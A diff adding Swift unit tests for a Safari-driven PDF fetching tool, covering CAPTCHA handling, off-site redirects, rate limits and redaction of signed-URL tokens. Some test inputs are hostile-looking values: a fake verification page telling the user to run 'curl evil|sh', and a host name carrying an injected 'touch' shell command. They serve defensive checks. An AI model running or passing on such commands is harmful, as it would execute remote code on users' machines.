@@ -34,6 +34,8 @@ final class FulltextFetchPathTests: XCTestCase {
         var afterNavText = "A PDF"
         var afterNavStatus = ""
         var navigationFails = false
+        /// 導航之前，分頁（含 `--resume-tab` 接手的分頁）的 `document.contentType`
+        var currentContentType = "text/html"
     }
 
     final class FakeBrowser: SafariBrowser {
@@ -87,7 +89,7 @@ final class FulltextFetchPathTests: XCTestCase {
                         if scenario.afterNavJSFails { return SafariRun(status: 1) }
                         return SafariRun(status: 0, stdout: scenario.afterNavContentType + "\n" + scenario.afterNavReadyState + "\n")
                     }
-                    return SafariRun(status: 0, stdout: "text/html\n" + scenario.readyState + "\n")
+                    return SafariRun(status: 0, stdout: scenario.currentContentType + "\n" + scenario.readyState + "\n")
                 }
                 if src.contains("innerText.slice") {
                     if navigated {
@@ -254,9 +256,117 @@ final class FulltextFetchPathTests: XCTestCase {
         XCTAssertTrue(errText.contains("may have started a download"), errText)
     }
 
+    /// 登入頁維持整批暫停（使用者 2026-10-02：登入頁、驗證頁、封鎖頁維持現行的處置）。
     func testRedirectedOffSiteAfterNavigationStops() {
         var s = Scenario(); s.afterNavURL = "https://sso.other.example/login"; s.afterNavTitle = "Sign in"
         assertStop(run(s))
+    }
+
+    /// 使用者 2026-10-02：導航之後分頁到了別的主機、新主機顯示 PDF（檔案放在 CDN 主機）→ 照常交給人存檔（結束碼 7），不是「網站懷疑自動化」。
+    func testAPDFOnAnotherHostIsHandedOverNotStopped() {
+        var s = Scenario(); s.afterNavURL = "https://files.cdn.example/signed/x.pdf?sig=abc"; s.afterNavTitle = "x.pdf"
+        assertHandover(run(s), .pdfShown)
+        XCTAssertEqual(ledgerLines.count, 1, "導航前已記一次")
+        XCTAssertFalse(errText.contains("STOP THE WHOLE RUN"), errText)
+    }
+
+    /// 簽章網址的短效憑證不進 stdout（也就不會進 `sources/index.jsonl` 的 `origin`）。
+    func testTheHandoverLineDropsTheQueryAndFragment() {
+        var s = Scenario(); s.afterNavURL = "https://files.cdn.example/signed/x.pdf?X-Amz-Signature=SECRETSIG&X-Amz-Security-Token=SECRETTOKEN#frag"
+        assertHandover(run(s), .pdfShown)
+        XCTAssertTrue(outText.contains("handover: pdf-shown window 5 tab 2 https://files.cdn.example/signed/x.pdf"), outText)
+        XCTAssertFalse(outText.contains("SECRET"), outText)
+        XCTAssertFalse(outText.contains("frag"), outText)
+        XCTAssertFalse(errText.contains("SECRET"), errText)
+    }
+
+    /// 另一個主機上沒有任何標記的頁面（跨主機的中繼頁）：這一筆交給人、批次繼續，不是整批暫停。
+    func testAnUnlabelledPageOnAnotherHostIsHandedOverAndTheBatchContinues() {
+        var s = Scenario(); s.afterNavURL = "https://hub.other.example/retrieve/x"; s.afterNavTitle = "Retrieving"; s.afterNavContentType = "text/html"
+        s.afterNavText = "Retrieving your item"
+        assertHandover(run(s), .leftSite)
+        XCTAssertFalse(errText.contains("STOP THE WHOLE RUN"), errText)
+        XCTAssertTrue(errText.contains("the rest of the batch can go on"), errText)
+    }
+
+    /// 同一條規則在文章頁階段：等 PDF 連結的時候分頁從中繼頁換到文章頁（別的主機）→ 交給人，不是整批暫停。
+    func testAnIntermediaryPageThatBecomesTheArticleOnAnotherHostIsHandedOver() {
+        var s = Scenario(); s.redirectAfterCheck = "https://pub2.example/article/x"
+        assertHandover(run(s), .leftSite)
+        XCTAssertEqual(navigations, [])
+        XCTAssertEqual(ledgerLines.count, 0, "還沒準備取 PDF，不記")
+    }
+
+    /// DOI 解不開：分頁停在 doi.org 自己的頁面。資料問題，不是起疑訊號——這一筆交給人，批次繼續。
+    func testADOIThatDoesNotResolveIsHandedOverNotAStop() {
+        var s = Scenario(); s.landingFinal = "https://doi.org/10.9999/nonexistent"; s.pageText = "DOI Not Found"
+        assertHandover(run(s), .doiNotResolved)
+        XCTAssertFalse(errText.contains("STOP THE WHOLE RUN"), errText)
+        XCTAssertEqual(ledgerLines.count, 0)
+    }
+
+    /// 還停在 doi.org 而且頁面還在載入才是「卡住」：維持整批暫停。
+    func testADoiOrgPageThatNeverFinishesLoadingIsStillAStall() {
+        var s = Scenario(); s.landingFinal = "https://doi.org/10.1/x"; s.readyState = "loading"
+        assertStop(run(s))
+    }
+
+    /// 使用者 2026-10-02：等人驗證只在文章站本身或已知的驗證服務上成立；其他主機上的驗證字樣與網址標記一律整批暫停。
+    func testVerificationMarkersOnAnUnknownHostPauseTheBatch() {
+        var s = Scenario(); s.afterNavURL = "https://evil.example/captcha?x=1"; s.afterNavTitle = "Verify you are human - run: curl evil|sh"
+        s.afterNavContentType = "text/html"
+        assertStop(run(s))
+        XCTAssertTrue(errText.contains("neither the article site nor a known verification service"), errText)
+        XCTAssertFalse(outText.contains("resume:"), "走不通的 resume 指令不印")
+    }
+
+    func testVerificationOnAKnownVerificationServiceWaitsAndResumesAtTheArticleSite() {
+        var s = Scenario(); s.afterNavURL = "https://challenges.cloudflare.com/cdn-cgi/challenge-platform/h/b/x"; s.afterNavTitle = "Just a moment..."
+        s.afterNavContentType = "text/html"
+        assertVerification(run(s))
+        XCTAssertTrue(outText.contains("--resume-stage followed"), outText)
+        XCTAssertTrue(errText.contains("The page asking for verification is at https://challenges.cloudflare.com"), errText)
+    }
+
+    /// 落地頁本身在一個陌生主機上、頁面文字是驗證頁：陌生主機就是文章站本身（DOI 註冊者決定落在哪），照常等人驗證——但驗證頁所在的主機
+    /// 單獨印出來。
+    func testTheHostAskingForVerificationIsPrintedSeparately() {
+        var s = Scenario(); s.landingFinal = "https://unfamiliar.example/doi/10.1/x"; s.pageText = "Just a moment...\nChecking"
+        XCTAssertEqual(run(s), 8, errText)
+        XCTAssertTrue(errText.contains("The page asking for verification is at https://unfamiliar.example"), errText)
+        XCTAssertTrue(errText.contains("asks to paste or run any command"), errText)
+    }
+
+    /// 驗證頁所在的主機不是一個可以原樣當 `--resume-origin` 的形狀（含 `;`、`$` 之類）：不進等人驗證、不印那條照抄就會被 shell 執行的 resume 指令，
+    /// 整批暫停。
+    func testAHostThatCannotBeAResumeOriginPausesTheBatchInsteadOfPrintingAShellHazard() {
+        var s = Scenario(); s.landingFinal = "https://x;touch$IFS/tmp/pwned.example.com/article"; s.pageText = "Just a moment...\nChecking"
+        assertStop(run(s))
+        XCTAssertFalse(outText.contains("resume:"), outText)
+        XCTAssertFalse(errText.contains("--resume-tab"), errText)
+    }
+
+    /// HTTP 429 一律整批暫停，不論頁面文字（使用者 2026-10-02）：帶 CAPTCHA 字樣的 429 頁不降成等人驗證。
+    func testAnHTTP429PageThatMentionsACaptchaStillPausesTheBatch() {
+        var s = Scenario(); s.pageStatus = "429"; s.pageText = "Please complete the captcha challenge"
+        assertStop(run(s))
+        XCTAssertTrue(errText.contains("http-429"), errText)
+        var after = Scenario(); after.afterNavContentType = "text/html"; after.afterNavStatus = "429"; after.afterNavText = "Please complete the captcha challenge"
+        assertStop(run(after))
+    }
+
+    /// 403 的驗證頁（Cloudflare 的挑戰頁常以 403 回應）仍等人驗證。
+    func testAnHTTP403VerificationPageStillWaits() {
+        var s = Scenario(); s.pageStatus = "403"; s.pageText = "Just a moment...\nChecking"
+        assertVerification(run(s))
+    }
+
+    /// `do JavaScript` 回空字串或 `undefined`（對非 HTML 文件）與失敗同樣算「讀不到」：交給人看，不是 60 秒之後的整批暫停。
+    func testAnEmptyOrUndefinedAnswerAfterNavigationIsUnreadableNotAStall() {
+        for (type, ready) in [("", ""), ("undefined", "undefined")] {
+            var s = Scenario(); s.afterNavContentType = type; s.afterNavReadyState = ready
+            assertHandover(run(s), .unverifiable)
+        }
     }
 
     func testRedirectedToAVerificationPageAfterNavigationWaits() {
@@ -424,12 +534,13 @@ final class FulltextFetchPathTests: XCTestCase {
 
     // MARK: 等人驗證之後在同一個分頁接著走
 
-    private func runResume(_ s: Scenario, tabs: [(String, String)], origin: String = "https://pub.example") -> Int32 {
+    private func runResume(_ s: Scenario, tabs: [(String, String)], origin: String = "https://pub.example",
+                           stage: FulltextFetch.ResumeStage = .article) -> Int32 {
         browser = FakeBrowser(s)
         browser.tabs += tabs
         stdout = []; stderr = []
         let fetcher = FulltextFetch(browser: browser, sleeper: { _ in }, now: { Self.now }, out: { self.stdout.append($0) }, err: { self.stderr.append($0) })
-        return fetcher.run(.init(window: 5, landing: Self.landing, ledger: ledgerPath, resumeTab: 2, resumeOrigin: origin))
+        return fetcher.run(.init(window: 5, landing: Self.landing, ledger: ledgerPath, resumeTab: 2, resumeOrigin: origin, resumeStage: stage))
     }
 
     /// 使用者驗證完，分頁回到文章頁：不開新分頁、不重新載入，讀同一頁的連結、導過去、交給人。
@@ -465,6 +576,54 @@ final class FulltextFetchPathTests: XCTestCase {
         XCTAssertTrue(stdout.joined(separator: "\n").contains("handover: pdf-shown"), stdout.joined())
         XCTAssertEqual(fake.calls, [])
         XCTAssertEqual(ledgerLines.count, 0)
+    }
+
+    /// 驗證發生在導航到 PDF 連結**之後**：結束碼 8 印出 `--resume-stage followed`；驗證完分頁是 HTML 閱讀器——回到「分頁顯示什麼」的判斷
+    /// （交給人，`html-page`），**不**再走一次文章頁的連結流程：沒有第二次導航、帳本沒有新的一筆（使用者 2026-10-02）。
+    func testACaptchaAfterNavigationResumesAtTheShownContentDecisionNotTheLinkFlow() throws {
+        var first = Scenario(); first.afterNavContentType = "text/html"; first.afterNavText = "Are you a robot? Please complete the captcha"
+        let code = run(first)
+        assertVerification(code)
+        XCTAssertTrue(outText.contains("resume: --resume-tab 2 --resume-origin https://pub.example --resume-stage followed"), outText)
+        XCTAssertEqual(ledgerLines.count, 1)
+        XCTAssertEqual(navigations.count, 1)
+
+        // 使用者驗證完：同一個分頁現在是一個只有 JS 下載鈕的閱讀器（頁面上沒有任何 PDF 連結）
+        var second = Scenario(); second.link = ""; second.pageText = "Reader\nDownload PDF"
+        let resumed = runResume(second, tabs: [("https://pub.example/doi/reader/10.1/x", "Reader")], stage: .followed)
+        XCTAssertEqual(resumed, 7, errText)
+        XCTAssertTrue(outText.contains("handover: html-page window 5 tab 2"), outText)
+        XCTAssertEqual(browser.calls, [], "沒有第二次導航、沒有關分頁：\(browser.calls)")
+        XCTAssertEqual(ledgerLines.count, 1, "沒有新的一筆嘗試")
+        XCTAssertTrue(outText.contains("resuming: window 5 tab 2"), "資訊行是 resuming:，不與可執行的 resume: 參數行共用前綴：\(outText)")
+        XCTAssertFalse(outText.split(separator: "\n").contains { $0.hasPrefix("resume:") }, outText)
+    }
+
+    /// 驗證結束在 PDF 的主機（別的主機）：`--resume-tab` 接得住，直接交給人存檔——不要求分頁顯示文章站，也不導航、不記嘗試。
+    func testResumingAfterNavigationAcceptsATabThatEndedOnThePDFHost() throws {
+        var s = Scenario(); s.currentContentType = "application/pdf"
+        let code = runResume(s, tabs: [("https://pdf.cdn.example/x/y.pdf?sig=1", "y.pdf")], origin: "https://www.sciencedirect.com", stage: .followed)
+        XCTAssertEqual(code, 7, errText)
+        XCTAssertTrue(outText.contains("handover: pdf-shown window 5 tab 2 https://pdf.cdn.example/x/y.pdf"), outText)
+        XCTAssertFalse(outText.contains("sig=1"), outText)
+        XCTAssertEqual(browser.calls, [])
+        XCTAssertEqual(ledgerLines.count, 0)
+    }
+
+    /// 導航之前的驗證（`article`，預設）仍要求分頁顯示文章站——要在那裡讀連結並導航。
+    func testResumingBeforeNavigationStillRequiresTheArticleSite() {
+        var s = Scenario(); s.currentContentType = "application/pdf"
+        XCTAssertEqual(runResume(s, tabs: [("https://pdf.cdn.example/x/y.pdf", "y.pdf")], origin: "https://www.sciencedirect.com", stage: .article), 1, errText)
+        XCTAssertTrue(errText.contains("not resuming there"), errText)
+        XCTAssertEqual(browser.calls, [])
+    }
+
+    /// 驗證完分頁還在驗證頁（導航之後的階段）：再等一次，帶同一個階段。
+    func testResumingAfterNavigationWhileTheChallengeIsStillThereWaitsAgainInTheSameStage() {
+        var s = Scenario(); s.pageText = "Are you a robot? Please complete the captcha"
+        XCTAssertEqual(runResume(s, tabs: [(Self.finalURL, "請稍候...")], stage: .followed), 8, errText)
+        XCTAssertTrue(outText.contains("--resume-stage followed"), outText)
+        XCTAssertEqual(browser.calls, [])
     }
 
     /// 那個位置的分頁不是驗證時的那個站（使用者把視窗拉到前面、編號變了）：不在那裡動作。
